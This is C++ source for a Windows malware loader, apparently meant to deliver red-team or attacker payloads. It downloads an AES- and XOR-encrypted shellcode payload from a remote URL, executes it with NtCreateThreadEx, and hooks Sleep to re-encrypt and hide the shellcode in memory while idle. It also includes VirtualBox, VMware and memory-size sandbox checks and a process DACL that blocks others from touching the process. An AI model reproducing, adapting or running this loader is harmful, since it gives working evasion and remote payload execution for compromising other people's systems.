#include "header.h"
#include <intrin.h>
#include <random>
#include "base64.h"
#include <fstream>
#include <iostream>
#include <cstring>
#include <windows.h>
#include <iostream>
#include <wininet.h>
#include <string>
#include "AES.h"
#include <TlHelp32.h>
#include <algorithm>
#include "resource.h"
#include <Sddl.h>
#include "syscall.h"

const char g_key[17] = "asdfwetyhjuytrfd";
const char g_iv[17] = "gfdertfghjkuyrtg";//ECB MODE不需要关心chain，可以填空

#define BUF_SIZE 512000

#pragma warning(disable:4996)
#pragma comment(lib, "wininet.lib")
#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" ) // 设置入口地址

HookedSleep g_hookedSleep;
FluctuationMetadata g_fluctuationData;
TypeOfFluctuation g_fluctuate;

using namespace std;

void WINAPI MySleep(DWORD dwMilliseconds)
{
    const LPVOID caller = (LPVOID)_ReturnAddress();
    iSF(caller);
    SED(caller);

    HookTrampolineBuffers buffers = { 0 };
    buffers.originalBytes = g_hookedSleep.sleepStub;
    buffers.originalBytesSize = sizeof(g_hookedSleep.sleepStub);

    fastTrampoline(false, (BYTE*)::Sleep, (void*)&MySleep, &buffers);

    // Perform sleep emulating originally hooked functionality.
    ::Sleep(dwMilliseconds);

    if (g_fluctuate == FluctuateToRW)
    {
        SED((LPVOID)caller);
    }
    fastTrampoline(true, (BYTE*)::Sleep, (void*)&MySleep);
}

std::vector<MEMORY_BASIC_INFORMATION> collectMemoryMap(HANDLE hProcess, DWORD Type)
{
    std::vector<MEMORY_BASIC_INFORMATION> out;
    const size_t MaxSize = (sizeof(ULONG_PTR) == 4) ? ((1ULL << 31) - 1) : ((1ULL << 63) - 1);

    uint8_t* address = 0;
    while (reinterpret_cast<size_t>(address) < MaxSize)
    {
        MEMORY_BASIC_INFORMATION mbi = { 0 };

        if (!VirtualQueryEx(hProcess, address, &mbi, sizeof(mbi)))
        {
            break;
        }

        if ((mbi.Protect == PAGE_EXECUTE_READWRITE || mbi.Protect == PAGE_EXECUTE_READ || mbi.Protect == PAGE_READWRITE)
            && ((mbi.Type & Type) != 0))
        {
            out.push_back(mbi);
        }

        address += mbi.RegionSize;
    }

    return out;
}

void iSF(const LPVOID caller)
{
    if ((g_fluctuate != NoFluctuation) && g_fluctuationData.shellcodeAddr == nullptr && iST(caller))
    {
        auto memoryMap = collectMemoryMap(GetCurrentProcess());

        for (const auto& mbi : memoryMap)
        {
            if (reinterpret_cast<uintptr_t>(caller) > reinterpret_cast<uintptr_t>(mbi.BaseAddress)
                && reinterpret_cast<uintptr_t>(caller) < (reinterpret_cast<uintptr_t>(mbi.BaseAddress) + mbi.RegionSize))
            {
                g_fluctuationData.shellcodeAddr = mbi.BaseAddress;
                g_fluctuationData.shellcodeSize = mbi.RegionSize;
                g_fluctuationData.currentlyEncrypted = false;

                std::random_device dev;
                std::mt19937 rng(dev());
                std::uniform_int_distribution<std::mt19937::result_type> dist4GB(0, 0xffffffff);

                g_fluctuationData.encodeKey1 = dist4GB(rng);
                g_fluctuationData.encodeKey2 = dist4GB(rng);
                return;
            }
        }

        ::ExitProcess(0);
    }
}

void xor32(uint8_t* buf, size_t bufSize, uint32_t xorKey1, uint32_t xorKey2)
{
    uint32_t* buf32 = reinterpret_cast<uint32_t*>(buf);

    auto bufSizeRounded = (bufSize - (bufSize % sizeof(uint32_t))) / 4;
    for (size_t i = 0; i < bufSizeRounded; i++)
    {
        buf32[i] ^= xorKey1;
        buf32[i] ^= xorKey2;
    }

    for (size_t i = 4 * bufSizeRounded; i < bufSize; i++)
    {
        buf[i] ^= static_cast<uint8_t>(xorKey2 & 0xff);
        buf[i] ^= static_cast<uint8_t>(xorKey1 & 0xff);
    }
}

bool iST(LPVOID address)
{
    MEMORY_BASIC_INFORMATION mbi = { 0 };
    if (VirtualQuery(address, &mbi, sizeof(mbi)))
    {
        if (mbi.Type == MEM_PRIVATE)
        {
            const DWORD expectedProtection = (g_fluctuate == FluctuateToRW) ? PAGE_READWRITE : PAGE_NOACCESS;
            return ((mbi.Protect & PAGE_EXECUTE_READ) || (mbi.Protect & PAGE_EXECUTE_READWRITE)|| (mbi.Protect & expectedProtection));
        }
    }

    return false;
}

bool fastTrampoline(bool installHook, BYTE* addressToHook, LPVOID jumpAddress, HookTrampolineBuffers* buffers)
{
#ifdef _WIN64
    uint8_t trampoline[] = {
        0x49, 0xBA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov r10, addr
        0x41, 0xFF, 0xE2                                            // jmp r10
    };

    uint64_t addr = (uint64_t)(jumpAddress);
    memcpy(&trampoline[2], &addr, sizeof(addr));
#else
    uint8_t trampoline[] = {
        0xB8, 0x00, 0x00, 0x00, 0x00,     // mov eax, addr
        0xFF, 0xE0                        // jmp eax
    };

    uint32_t addr = (uint32_t)(jumpAddress);
    memcpy(&trampoline[1], &addr, sizeof(addr));
#endif

    DWORD dwSize = sizeof(trampoline);
    DWORD oldProt = 0;
    bool output = false;

    if (installHook)
    {
        if (buffers != NULL)
        {
            if (buffers->previousBytes == nullptr || buffers->previousBytesSize == 0)
            {
                return false;
            }
            memcpy(buffers->previousBytes, addressToHook, buffers->previousBytesSize);
        }

        if (VirtualProtect(addressToHook,dwSize,PAGE_EXECUTE_READWRITE,&oldProt))
        {
            memcpy(addressToHook, trampoline, dwSize);
            output = true;
        }
    }
    else
    {
        dwSize = buffers->originalBytesSize;

        if (VirtualProtect(addressToHook,dwSize,PAGE_EXECUTE_READWRITE,&oldProt))
        {
            memcpy(addressToHook, buffers->originalBytes, dwSize);
            output = true;
        }
    }

    static typeNtFlushInstructionCache pNtFlushInstructionCache = NULL;
    if (!pNtFlushInstructionCache)
    {
        pNtFlushInstructionCache = (typeNtFlushInstructionCache)GetProcAddress(GetModuleHandleA("ntdll"), "NtFlushInstructionCache");
    }

    pNtFlushInstructionCache(GetCurrentProcess(), addressToHook, dwSize);
    VirtualProtect(addressToHook,dwSize,oldProt,&oldProt);
    return output;
}

bool hookSleep()
{
    HookTrampolineBuffers buffers = { 0 };
    buffers.previousBytes = g_hookedSleep.sleepStub;
    buffers.previousBytesSize = sizeof(g_hookedSleep.sleepStub);

    g_hookedSleep.origSleep = reinterpret_cast<typeSleep>(::Sleep);

    if (!fastTrampoline(true, (BYTE*)::Sleep, (void*)&MySleep, &buffers))
        return false;

    return true;
}

void SED(LPVOID callerAddress)
{
    if ((g_fluctuate != NoFluctuation) && g_fluctuationData.shellcodeAddr != nullptr && g_fluctuationData.shellcodeSize > 0)
    {
        if (!iST(callerAddress))
        {
            return;
        }

        DWORD oldProt = 0;

        if (!g_fluctuationData.currentlyEncrypted || (g_fluctuationData.currentlyEncrypted && g_fluctuate == FluctuateToNA))
        {
            ::VirtualProtect(g_fluctuationData.shellcodeAddr, g_fluctuationData.shellcodeSize, PAGE_READWRITE, &g_fluctuationData.protect);
        }

        xor32(reinterpret_cast<uint8_t*>(g_fluctuationData.shellcodeAddr), g_fluctuationData.shellcodeSize, g_fluctuationData.encodeKey1, g_fluctuationData.encodeKey2);

        if (!g_fluctuationData.currentlyEncrypted && g_fluctuate == FluctuateToNA)
        {
            ::VirtualProtect(g_fluctuationData.shellcodeAddr, g_fluctuationData.shellcodeSize, PAGE_NOACCESS, &oldProt);
        }
        else if (g_fluctuationData.currentlyEncrypted)
        {
            ::VirtualProtect(g_fluctuationData.shellcodeAddr, g_fluctuationData.shellcodeSize, g_fluctuationData.protect, &oldProt);
        }

        g_fluctuationData.currentlyEncrypted = !g_fluctuationData.currentlyEncrypted;
    }
}

bool iS(std::vector<uint8_t>& shellcode, HandlePtr& thread)
{
    HANDLE hHostThread = INVALID_HANDLE_VALUE;
    auto alloc = VirtualAlloc(NULL, shellcode.size() + 1, MEM_COMMIT, PAGE_READWRITE);

    memcpy(alloc, shellcode.data(), shellcode.size());
    DWORD old;
    VirtualProtect(alloc, shellcode.size() + 1, Shellcode_Memory_Protection, &old);
    shellcode.clear();
    SIZE_T sDataSize = shellcode.size();
    NtCreateThreadEx(&hHostThread, 0x1FFFFF, NULL, (HANDLE)-1, (LPTHREAD_START_ROUTINE)alloc, NULL, FALSE, NULL, NULL, NULL, NULL);
    NtWaitForMultipleObjects(1, &hHostThread, WaitAll, FALSE, NULL);
    NtFreeVirtualMemory((HANDLE)-1, &alloc, &sDataSize, MEM_RELEASE);
    return 0;
}

// CCalculatorApp initialization
string DecryptionAES(const string& strSrc) //AES解密
{
    string strData = ko::Base64::decode(strSrc);
    size_t length = strData.length();
    //密文
    char* szDataIn = new char[length + 1];
    memcpy(szDataIn, strData.c_str(), length + 1);
    //明文
    char* szDataOut = new char[length + 1];
    memcpy(szDataOut, strData.c_str(), length + 1);

    //进行AES的CBC模式解密
    AES aes;
    aes.MakeKey(g_key, g_iv, 16, 16);
    aes.Decrypt(szDataIn, szDataOut, length, AES::CBC);

    //去PKCS7Padding填充
    if (0x00 < szDataOut[length - 1] <= 0x16)
    {
        int tmp = szDataOut[length - 1];
        for (int i = length - 1; i >= length - tmp; i--)
        {
            if (szDataOut[i] != tmp)
            {
                memset(szDataOut, 0, length);
                cout << "去填充失败！解密出错！！" << endl;
                break;
            }
            else
                szDataOut[i] = 0;
        }
    }
    string strDest(szDataOut);
    delete[] szDataIn;
    delete[] szDataOut;
    return strDest;
}

int check(char* name) {
    const char* list[2] = { "VBoxService.exe","VBoxTray.exe" };
    for (int i = 0; i < 2; ++i) {
        if (strcmp(name, list[i]) == 0)
            return -1;
    }
    return 0;
}

bool CheckProcess()
{
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(pe32);
    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    BOOL bResult = Process32First(hProcessSnap, &pe32);
    while (bResult) {
        char sz_Name[MAX_PATH] = { 0 };
        WideCharToMultiByte(CP_ACP, 0, pe32.szExeFile, -1, sz_Name, sizeof(sz_Name), NULL, NULL);
        if (check(sz_Name) == -1)
            return false;
        bResult = Process32Next(hProcessSnap, &pe32);
    }
    return true;
}

bool checkReg() {
    HKEY hkey;
    if (RegOpenKey(HKEY_CLASSES_ROOT, L"\\Applications\\VMwareHostOpen.exe", &hkey) == ERROR_SUCCESS)
    {
        return true;
    }
    else
    {
        return false;
    }
}

bool CheckMemory()
{
    _MEMORYSTATUSEX mst;
    DWORDLONG d_size = 4294496257;
    mst.dwLength = sizeof(mst);
    GlobalMemoryStatusEx(&mst);
    if (mst.ullTotalPhys < d_size)
        return false;
    else
        return true;
}

void Set() 
{
    LPCWSTR sddl = L"D:P"
        L"(D;OICI;GA;;;WD)"  
        L"(A;OICI;GA;;;SY)"  
        L"(A;OICI;GA;;;OW)";

    PSECURITY_DESCRIPTOR securityDescriptor = nullptr;

    if (!ConvertStringSecurityDescriptorToSecurityDescriptorW(sddl, SDDL_REVISION_1, &securityDescriptor, nullptr)) 
    {
        return;
    }

    if (!SetKernelObjectSecurity(GetCurrentProcess(), DACL_SECURITY_INFORMATION, securityDescriptor)) 
    {
        return;
    }

    LocalFree(securityDescriptor);
}

LPSTR GUT(LPSTR lpcInterNetURL, char* buff)
{
    HINTERNET hSession;
    LPSTR lpResult = NULL;
    hSession = InternetOpen(L"WinInet", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);

    if (hSession != NULL)
    {
        HINTERNET hRequest;
        hRequest = InternetOpenUrlA(hSession, lpcInterNetURL, NULL, 0, INTERNET_FLAG_RELOAD, 0);
        if (hRequest != NULL)
        {
            DWORD dwBytesRead;
            char szBuffer[BUF_SIZE] = { 0 };
            if (InternetReadFile(hRequest, szBuffer, BUF_SIZE, &dwBytesRead))
            {
                RtlMoveMemory(buff, szBuffer, BUF_SIZE);
                return 0;
            }
        }

    }
    return lpResult;
}

int key[] = { 1,2,3,4,5,6,7 };
void decode(string& c, int key[]) {
    int len = c.size();
    for (int i = 0; i < len; i++) {
        c[i] = c[i] ^ key[i % 7];
    }
}

void run(std::vector<uint8_t>& shellcode)
{
   g_fluctuate = (TypeOfFluctuation)1;
   hookSleep();
   HandlePtr thread(NULL, &::CloseHandle);
   iS(shellcode, thread);
   WaitForSingleObject(thread.get(), INFINITE);
}

void copy()
{
    const int XK1 = 8;
    const int XK2 = 10;
    char buf1[BUF_SIZE] = { 0 };
    //HTTP
    std::string str1 = "str1";
    std::string str2 = "str2";

    std::string str = str1 + str2;
    decode(str, key);
    char* url = (char*)str.data();
    GUT(url, buf1);
    std::string rest2_reference = buf1;
    reverse(rest2_reference.begin(), rest2_reference.end());
    string decrypt_shellcode = DecryptionAES(rest2_reference);
    std::string rest2_decoded = ko::Base64::decode(decrypt_shellcode);

    const char* xx = rest2_decoded.c_str();

    std::vector<uint8_t> sc;

    for (int j = 0; j < rest2_decoded.length(); j++)
    {
        sc.push_back(xx[j] ^ XK2 ^ XK1);
    }

    run(sc);

   
    return;
}

int main()
{
    //if (CheckProcess() == false || checkReg() == true || CheckMemory() == false)
    //{
    //    exit(-1);
    //}

    Set();
    copy();
    return 0;
}

